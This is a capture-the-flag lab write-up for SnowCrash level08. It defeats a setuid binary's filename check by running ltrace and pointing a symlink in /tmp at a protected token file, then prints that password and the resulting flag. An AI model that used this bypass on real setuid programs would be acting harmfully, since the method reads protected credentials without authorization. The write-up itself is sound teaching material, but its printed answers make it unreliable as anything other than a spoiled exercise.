How to find:

    level08@SnowCrash:~$ ls -la
    total 28
    dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
    d--x--x--x  1 root    users    340 Aug 30  2015 ..
    -r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
    -r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
    -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
    -r-x------  1 level08 level08  675 Apr  3  2012 .profile
    -rw-------  1 flag08  flag08    26 Mar  5  2016 token

level08 and token files

    level08@SnowCrash:~$ ./level08 
    ./level08 [file to read]

    level08@SnowCrash:~$ ./token
    -bash: ./token: Permission denied
    
    level08@SnowCrash:~$ cat token 
    cat: token: Permission denied
    
    level08@SnowCrash:~$ ./level08 token
    You may not access 'token'

**ltrace** tracks function calls to shared libraries such as printf, malloc, getenv, system, etc. 
Not only shows which functions are called but also the arguments passed to those functions and their return values.

    level08@SnowCrash:~$ ltrace ./level08 token

    __libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
    strstr("token", "token")                                        = "token"
    printf("You may not access '%s'\n", "token"You may not access 'token'
    )                    = 27
    exit(1 <unfinished ...>
    +++ exited (status 1) +++


User flag08 owns both files so once symbolik linked to the token file it will open the file

    level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/maitoquen
    level08@SnowCrash:~$ ./level08 /tmp/maitoquen
    quif5eloekouj29ke0vouxean

Now login user flag08

    level08@SnowCrash:~$ su flag08
    Password: 
    Don't forget to launch getflag !
    flag08@SnowCrash:~$ getflag
    Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f